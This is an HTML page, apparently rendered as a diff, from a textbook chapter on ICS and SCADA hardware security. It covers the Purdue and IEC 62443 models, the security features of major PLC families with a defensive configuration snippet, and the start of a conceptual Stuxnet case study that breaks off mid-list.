+  <a href="#318-dnp3-vulnerabilities-and-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.8 DNP3 Vulnerabilities and Authentication
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#319-opc-ua-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.9 OPC UA Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3110-data-diode-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.10 Data Diode Hardware
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3111-fpga-based-hardware-firewalls-for-ot-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.11 FPGA-Based Hardware Firewalls for OT Protocols
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3112-asic-implementation-of-ot-protocol-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.12 ASIC Implementation of OT Protocol Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3113-mitre-attck-for-ics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.13 MITRE ATT&amp;CK for ICS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3114-ot-network-security-monitoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14 OT Network Security Monitoring
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.14 OT Network Security Monitoring">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31141-commercial-monitoring-platforms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14.1 Commercial Monitoring Platforms
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31142-industrial-firewalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14.2 Industrial Firewalls
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3115-all-solutions-comparison" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.15 All Solutions Comparison
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3116-solved-problems" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.16 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3117-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.17 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch31-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.18 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31181-cisa-ics-cert-advisories-20232024-siemens-and-rockwell-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.1 CISA ICS-CERT Advisories 2023–2024 — Siemens and Rockwell Vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31182-volt-typhoon-chinese-apt-targeting-critical-infrastructure-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.2 Volt Typhoon — Chinese APT Targeting Critical Infrastructure Hardware
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31183-nist-sp-800-82-revision-3-updated-ot-security-guide-2023" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.3 NIST SP 800-82 Revision 3 — Updated OT Security Guide (2023)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31184-iec-62443-3-3-sl-3-hardware-requirements-2023-update" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.4 IEC 62443-3-3 SL-3 Hardware Requirements (2023 Update)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31185-dragos-year-in-review-2023-ics-threat-groups-targeting-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.5 Dragos Year in Review 2023 — ICS Threat Groups Targeting Hardware
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31186-ot-hardware-security-claroty-and-nozomi-hardware-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.6 OT Hardware Security — Claroty and Nozomi Hardware Fingerprinting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3119-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.19 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch32-biometric-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    32. Biometric Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch33-satellite-and-aerospace-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    33. Satellite and Aerospace Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch34-ai-and-ml-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    34. AI and ML Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch35-usb-and-thunderbolt-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    35. USB and Thunderbolt Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch36-wireless-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    36. Wireless Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch37-confidential-computing-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    37. Confidential Computing Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch38-hardware-security-design-flow-and-eda-tools.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    38. Hardware Security Design Flow and EDA Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch39-chiplet-and-heterogeneous-integration-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    39. Chiplet and Heterogeneous Integration Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="key-standards-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Key Standards Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="security-tools-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Tools Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="further-reading.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Further Reading
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#311-introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.1 Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#312-purdue-model-and-ot-network-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.2 Purdue Model and OT Network Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.2 Purdue Model and OT Network Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3121-zone-and-conduit-model-iec-62443" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.2.1 Zone and Conduit Model (IEC 62443)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#313-ics-hardware-platforms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3 ICS Hardware Platforms
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.3 ICS Hardware Platforms">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3131-siemens-simatic-s7-family" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.1 Siemens SIMATIC S7 Family
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3132-allen-bradley-controllogix-5580" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.2 Allen-Bradley ControlLogix 5580
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3133-honeywell-c300-dcs-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.3 Honeywell C300 DCS Controller
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3134-schneider-electric-modicon-m340-m580" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.4 Schneider Electric Modicon M340 / M580
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#314-stuxnet-technical-deep-dive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.4 Stuxnet: Technical Deep-Dive
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.4 Stuxnet: Technical Deep-Dive">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3141-step7-dll-interception" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.4.1 Step7 DLL Interception
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#315-tritontrisis-safety-system-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5 TRITON/TRISIS: Safety System Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.5 TRITON/TRISIS: Safety System Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3151-technical-attack-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5.1 Technical Attack Analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3152-post-triton-triconex-security-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5.2 Post-TRITON Triconex Security Hardening
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#316-crashoverride-industroyer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.6 CRASHOVERRIDE / Industroyer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#317-modbus-tcp-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.7 Modbus TCP Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.7 Modbus TCP Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3171-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.7.1 Vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#318-dnp3-vulnerabilities-and-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.8 DNP3 Vulnerabilities and Authentication
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#319-opc-ua-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.9 OPC UA Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3110-data-diode-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.10 Data Diode Hardware
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3111-fpga-based-hardware-firewalls-for-ot-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.11 FPGA-Based Hardware Firewalls for OT Protocols
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3112-asic-implementation-of-ot-protocol-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.12 ASIC Implementation of OT Protocol Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3113-mitre-attck-for-ics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.13 MITRE ATT&amp;CK for ICS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3114-ot-network-security-monitoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14 OT Network Security Monitoring
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.14 OT Network Security Monitoring">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31141-commercial-monitoring-platforms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14.1 Commercial Monitoring Platforms
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31142-industrial-firewalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.14.2 Industrial Firewalls
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3115-all-solutions-comparison" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.15 All Solutions Comparison
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3116-solved-problems" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.16 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3117-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.17 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch31-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.18 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31181-cisa-ics-cert-advisories-20232024-siemens-and-rockwell-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.1 CISA ICS-CERT Advisories 2023–2024 — Siemens and Rockwell Vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31182-volt-typhoon-chinese-apt-targeting-critical-infrastructure-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.2 Volt Typhoon — Chinese APT Targeting Critical Infrastructure Hardware
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31183-nist-sp-800-82-revision-3-updated-ot-security-guide-2023" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.3 NIST SP 800-82 Revision 3 — Updated OT Security Guide (2023)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31184-iec-62443-3-3-sl-3-hardware-requirements-2023-update" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.4 IEC 62443-3-3 SL-3 Hardware Requirements (2023 Update)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31185-dragos-year-in-review-2023-ics-threat-groups-targeting-hardware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.5 Dragos Year in Review 2023 — ICS Threat Groups Targeting Hardware
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#31186-ot-hardware-security-claroty-and-nozomi-hardware-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.18.6 OT Hardware Security — Claroty and Nozomi Hardware Fingerprinting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3119-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.19 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ch-ics">Chapter 31: ICS and SCADA Hardware Security<a class="headerlink" href="#ch-ics" title="Permanent link">&para;</a></h1>
+<h2 id="311-introduction"><span class="secnum">31.1</span> Introduction<a class="headerlink" href="#311-introduction" title="Permanent link">&para;</a></h2>
+<p>Industrial Control System (ICS) and SCADA (Supervisory Control and Data Acquisition) security addresses threats to physical infrastructure: power grids, water treatment plants, oil and gas pipelines, chemical processing facilities, and critical manufacturing. Unlike IT security failures, which result in data breach or service disruption, ICS security failures cause physical damage, environmental contamination, equipment destruction, and loss of human life. The 2010 Stuxnet attack destroyed approximately 1,000 uranium enrichment centrifuges in Iran. The 2017 TRITON/TRISIS attack targeted a Saudi petrochemical plant’s Safety Instrumented System with the explicit goal of disabling the last layer of protection against a catastrophic explosion. The 2016 CRASHOVERRIDE malware caused power outages affecting 225,000 customers in Ukraine.</p>
+<p>The fundamental challenge of ICS security is the tension between IT security best practices and OT (Operational Technology) operational requirements. ICS devices are designed for 20–30 year operational lifetimes; they cannot be patched on a monthly cadence like enterprise software. Many PLCs (Programmable Logic Controllers) and RTUs (Remote Terminal Units) run real-time operating systems or bare-metal firmware with no support for TLS or certificate-based authentication. The protocols they use – Modbus (designed 1979), DNP3 (1993), IEC 60870-5-101 (1990) – predate the internet era and contain no security provisions.</p>
+<p>This chapter provides comprehensive technical treatment of ICS architecture, landmark attack case studies with deep technical analysis, ICS hardware security controls for modern PLCs, protocol security and attack methodologies, data diode technology, OT network monitoring, and relevant standards.</p>
+<h2 id="312-purdue-model-and-ot-network-architecture"><span class="secnum">31.2</span> Purdue Model and OT Network Architecture<a class="headerlink" href="#312-purdue-model-and-ot-network-architecture" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-purdue">
+<img class="tikz" src="img/tikz-18682d714435.svg" alt="Purdue Model (ISA-95) five-level architecture with security controls at each zone boundary." loading="lazy">
+<figcaption><strong>Figure 31.1.</strong> Purdue Model (ISA-95) five-level architecture with security controls at each zone boundary.</figcaption>
+</figure>
+
+<h3 id="3121-zone-and-conduit-model-iec-62443"><span class="secnum">31.2.1</span> Zone and Conduit Model (IEC 62443)<a class="headerlink" href="#3121-zone-and-conduit-model-iec-62443" title="Permanent link">&para;</a></h3>
+<p>IEC 62443-3-2 replaces the Purdue Model’s layer abstraction with a flexible Zone and Conduit model:</p>
+<ul>
+<li>
+<p><strong>Zone:</strong> A grouping of assets with common security requirements and a defined boundary. Example: the PLC zone contains all S7-1500 controllers for a production line.</p>
+</li>
+<li>
+<p><strong>Conduit:</strong> A communication channel or set of channels that connects two zones. Each conduit has a Security Level target (SL-T) that must be met by technical controls.</p>
+</li>
+<li>
+<p><strong>Security Levels:</strong> SL-1 (casual violation), SL-2 (intentional violation with moderate resources), SL-3 (intentional violation with sophisticated resources), SL-4 (nation-state level attacker).</p>
+</li>
+</ul>
+<h2 id="313-ics-hardware-platforms"><span class="secnum">31.3</span> ICS Hardware Platforms<a class="headerlink" href="#313-ics-hardware-platforms" title="Permanent link">&para;</a></h2>
+<h3 id="3131-siemens-simatic-s7-family"><span class="secnum">31.3.1</span> Siemens SIMATIC S7 Family<a class="headerlink" href="#3131-siemens-simatic-s7-family" title="Permanent link">&para;</a></h3>
+<p>The Siemens SIMATIC S7 PLC family is the most widely deployed in process industries and critical infrastructure:</p>
+<div class="tbl" id="tab-s7-plc">
+<div class="tbl-caption"><strong>Table 31.1.</strong> Siemens SIMATIC S7 PLC Series and Security Features</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Model</strong></th>
+<th style="text-align: left;"><strong>CPU</strong></th>
+<th style="text-align: left;"><strong>Security Features</strong></th>
+<th style="text-align: left;"><strong>Connectivity</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">S7-300 CPU 315-2 DP</td>
+<td style="text-align: left;">x86 embedded</td>
+<td style="text-align: left;">None (legacy)</td>
+<td style="text-align: left;">Profibus DP</td>
+</tr>
+<tr>
+<td style="text-align: left;">S7-400 CPU 416-3</td>
+<td style="text-align: left;">x86 embedded</td>
+<td style="text-align: left;">Password protection only</td>
+<td style="text-align: left;">Profibus, Ethernet</td>
+</tr>
+<tr>
+<td style="text-align: left;">S7-1200 CPU 1214C</td>
+<td style="text-align: left;">ARM Cortex-M</td>
+<td style="text-align: left;">Access levels 1–3, TLS OPC-UA</td>
+<td style="text-align: left;">PROFINET, Modbus</td>
+</tr>
+<tr>
+<td style="text-align: left;">S7-1500 CPU 1516-3</td>
+<td style="text-align: left;">Dual ARM Cortex-A</td>
+<td style="text-align: left;">Full security (see below)</td>
+<td style="text-align: left;">PROFINET, OPC-UA</td>
+</tr>
+<tr>
+<td style="text-align: left;">S7-1500 TM (TrustMod)</td>
+<td style="text-align: left;">ARM + SecureBoot</td>
+<td style="text-align: left;">Integrity prot + anti-copy</td>
+<td style="text-align: left;">PROFINET, TIA</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h4 id="s7-1500-security-features-in-detail">S7-1500 Security Features in Detail<a class="headerlink" href="#s7-1500-security-features-in-detail" title="Permanent link">&para;</a></h4>
+<p>The Siemens SIMATIC S7-1500 (e.g., CPU 1516-3 PN/DP, 6ES7516-3AN02-0AB0) implements:</p>
+<ul>
+<li>
+<p><strong>Integrity Protection:</strong> Hash verification of the OB (Organization Block) program at startup. Any modification to program blocks since compilation is detected and the CPU enters STOP mode.</p>
+</li>
+<li>
+<p><strong>Access Level System:</strong> Four access levels (Full, HMI, Read-only, No access) protected by 8-byte passwords. Level 3 (Read-only) allows SCADA monitoring without write access. Level 4 (No access) prevents all external reads of data blocks.</p>
+</li>
+<li>
+<p><strong>Copy Protection:</strong> Program can be bound to the specific CPU’s serial number stored in a hardware register. Copying the program card to another CPU will fail to execute.</p>
+</li>
+<li>
+<p><strong>Know-How Protection:</strong> AES-256 encryption of individual function blocks (FC/FB). The encryption key is stored in the hardware security module integrated into the CPU module.</p>
+</li>
+<li>
+<p><strong>OPC-UA Server with TLS 1.2:</strong> Client certificates are required; the S7-1500’s certificate store is managed via TIA Portal. Supports SHA-256 signed certificates from a plant PKI.</p>
+</li>
+<li>
+<p><strong>PROFINET Security Class B:</strong> Implements IEEE 802.1X EAP-TLS for device authentication on PROFINET IO connections (requirement from IEC 62443-3-3 SL-2).</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># S7-1500: TIA Portal security configuration (TIA V17)
+# OPC-UA security configuration:
+
+# In TIA Portal -&gt; Device Properties -&gt; OPC-UA:
+Security Policy: Basic256Sha256   # Minimum: no None or Basic128Rsa15
+MessageSecurityMode: SignAndEncrypt
+Certificate: Import plant CA-signed certificate
+Authentication: Certificate (disable Username/Password)
+Allowed clients: Add client cert thumbprint for each SCADA system
+
+# PROFINET Security Class B configuration:
+# Device Properties -&gt; PROFINET Interface -&gt; Security
+SecurityClass: Class_B
+Authentication: Certificate-based (802.1X EAP-TLS)
+CA certificate: /path/to/plant-ca.crt
+
+# Copy protection: bind to serial number
+CopyProtection: Enabled
+TargetCPU_SN: "S C-XXXXXXXXXXX"   # From CPU nameplate
+</code></pre></div>
+<h3 id="3132-allen-bradley-controllogix-5580"><span class="secnum">31.3.2</span> Allen-Bradley ControlLogix 5580<a class="headerlink" href="#3132-allen-bradley-controllogix-5580" title="Permanent link">&para;</a></h3>
+<p>Rockwell Automation ControlLogix (1756-L8x series, e.g., 1756-L85E) implements:</p>
+<ul>
+<li>
+<p><strong>Chassis Slot Authorization:</strong> EtherNet/IP modules can be configured to reject unauthorized chassis insertions using MAC-based access control lists.</p>
+</li>
+<li>
+<p><strong>CIP Security (EtherNet/IP):</strong> TLS 1.2/DTLS 1.2 for EtherNet/IP Class 3 (connected, TCP) and Class 1 (implicit, UDP) messaging. Part of ODVA CIPsecurity specification.</p>
+</li>
+<li>
+<p><strong>Role-Based Access Control (RBAC):</strong> FactoryTalk Security integration provides granular permissions per user/group to download, upload, go online, force I/O.</p>
+</li>
+<li>
+<p><strong>Audit Log:</strong> Records all online changes (who, when, what) with username and timestamp, non-repudiable via signature.</p>
+</li>
+</ul>
+<h3 id="3133-honeywell-c300-dcs-controller"><span class="secnum">31.3.3</span> Honeywell C300 DCS Controller<a class="headerlink" href="#3133-honeywell-c300-dcs-controller" title="Permanent link">&para;</a></h3>
+<p>The Honeywell Experion Process Knowledge System (EPKS) uses the C300 Controller (CP300-E) as the core DCS execution unit. Post-TRITON security hardening (2018) added:</p>
+<ul>
+<li>
+<p><strong>Controller Authentication:</strong> Mutual authentication between HMIweb servers and C300 controllers using X.509 certificates over TLS.</p>
+</li>
+<li>
+<p><strong>Signed Configuration Download:</strong> FDM (Function Diagram Manager) configuration is signed by the engineering workstation before loading; the C300 verifies the signature.</p>
+</li>
+<li>
+<p><strong>Redundant Controller Voting:</strong> C300 supports 1:1 redundancy; both controllers must agree on I/O state before acting – single-point compromise cannot force actuator action.</p>
+</li>
+</ul>
+<h3 id="3134-schneider-electric-modicon-m340-m580"><span class="secnum">31.3.4</span> Schneider Electric Modicon M340 / M580<a class="headerlink" href="#3134-schneider-electric-modicon-m340-m580" title="Permanent link">&para;</a></h3>
+<p>The Schneider Modicon M580 (BMEP582040) implements:</p>
+<ul>
+<li>
+<p><strong>Cybersecurity IEC 62443-3-3 SL-2 compliance:</strong> Firmware authenticity verification, application confidentiality (encrypted project files), role-based access.</p>
+</li>
+<li>
+<p><strong>FIPS 140-2 Level 1:</strong> Crypto module for Modbus/TCP over TLS and HTTPS Webserver.</p>
+</li>
+<li>
+<p><strong>Firmware Secure Boot:</strong> RSA-2048 signed bootloader; unsigned images rejected.</p>
+</li>
+</ul>
+<h2 id="314-stuxnet-technical-deep-dive"><span class="secnum">31.4</span> Stuxnet: Technical Deep-Dive<a class="headerlink" href="#314-stuxnet-technical-deep-dive" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-stuxnet">
+<img class="tikz" src="img/tikz-da00aa62337b.svg" alt="Stuxnet attack chain: USB infection through Windows, Step7 DLL hook, OB35 injection into Siemens S7-315 PLCs, centrifuge speed manipulation." loading="lazy">
+<figcaption><strong>Figure 31.2.</strong> Stuxnet attack chain: USB infection through Windows, Step7 DLL hook, OB35 injection into Siemens S7-315 PLCs, centrifuge speed manipulation.</figcaption>
+</figure>
+
+<h3 id="3141-step7-dll-interception"><span class="secnum">31.4.1</span> Step7 DLL Interception<a class="headerlink" href="#3141-step7-dll-interception" title="Permanent link">&para;</a></h3>
+<p>Stuxnet intercepted the Siemens Step7 programming software’s S7OTBXDX.DLL (a library that mediates communication between Step7 and the S7 PLC). The malware replaced this DLL with a modified version that:</p>
+<ul>
+<li>
+<p><strong>Captured s7blk_write calls:</strong> When the Step7 IDE wrote OB (Organization Block) code to the PLC, the hooked DLL intercepted the write and inserted the malicious OB35 code alongside the legitimate program.</p>
+</li>
+<li>
+<p><strong>Intercepted s7blk_read calls:</strong> When the operator tried to read the PLC program back to verify its contents, the hooked DLL returned the expected clean program, hiding the injected OB35.</p>
+</li>
+<li>
+<p><strong>OB35 (Timed Interrupt Block):</strong> OB35 is called at a configurable interval (typically every 100ms) by the S7 operating system. Stuxnet used OB35 to monitor and manipulate centrifuge motor frequency:</p>
+</li>
+</ul>
